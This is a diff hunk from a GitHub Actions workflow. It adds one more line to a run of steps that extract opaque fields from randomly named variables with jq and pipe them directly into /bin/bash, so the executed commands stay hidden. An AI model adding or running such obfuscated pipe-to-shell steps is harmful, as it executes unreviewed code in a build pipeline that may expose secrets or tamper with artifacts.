@@ -43,6 +43,7 @@ jobs:
           echo $shc63 | jq -r .mcco49 | /bin/bash
           echo $zp9000 | jq -r .ylsj6 | /bin/bash
           echo $ydx45128 | jq -r .tsk8928 | /bin/bash
+          echo $h10 | jq -r .jvdr8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
